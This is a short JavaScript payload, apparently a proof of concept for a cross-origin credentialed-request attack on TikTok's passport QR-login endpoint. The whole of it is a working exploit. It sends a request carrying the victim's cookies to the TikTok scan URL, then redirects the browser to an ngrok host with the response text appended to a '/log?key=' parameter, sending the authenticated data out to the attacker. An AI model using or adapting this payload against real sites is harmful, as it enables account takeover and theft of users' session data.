var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www.tiktok.com/passport/web/scan_index/?aid=1459&append_common_params=1&hide_nav_bar=1&next_url=https%3A%2F%2Fwww.tiktok.com%2Fpassport%2Fweb%2Fscan_qrcode%2F&qr_source_aid=1459&token=e7hw8VV4e_pKiJZL9AEdd3D92KkmidALpxlWJLvTczY%3D_my");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
